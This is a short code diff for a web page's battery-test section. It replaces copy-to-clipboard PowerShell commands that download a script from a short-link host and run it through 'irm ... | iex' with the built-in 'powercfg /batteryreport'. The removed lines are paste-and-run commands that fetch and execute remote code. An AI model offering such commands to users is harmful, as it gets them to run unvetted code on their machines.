@@ -1712,9 +1712,9 @@
 
     // ── 7. BATTERY TEST ────────────────────────────────────────────────────
     initBatteryUIEvents() {
-      this.setupCopyBtn('tc-copy-cmd-btn', 'irm j2c.cc/batterycheck | iex');
-      this.setupCopyBtn('tc-copy-trouble1-btn', 'iex (curl.exe -s --doh-url https://1.1.1.1/dns-query j2c.cc/batterycheck | Out-String)');
-      this.setupCopyBtn('tc-copy-trouble2-btn', '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12');
+      this.setupCopyBtn('tc-copy-cmd-btn', 'powercfg /batteryreport');
+      this.setupCopyBtn('tc-copy-trouble1-btn', 'powercfg /batteryreport');
+      this.setupCopyBtn('tc-copy-trouble2-btn', 'powercfg /batteryreport');
 
       const troubleBtn = document.getElementById('tc-trouble-btn');
       if (troubleBtn) {
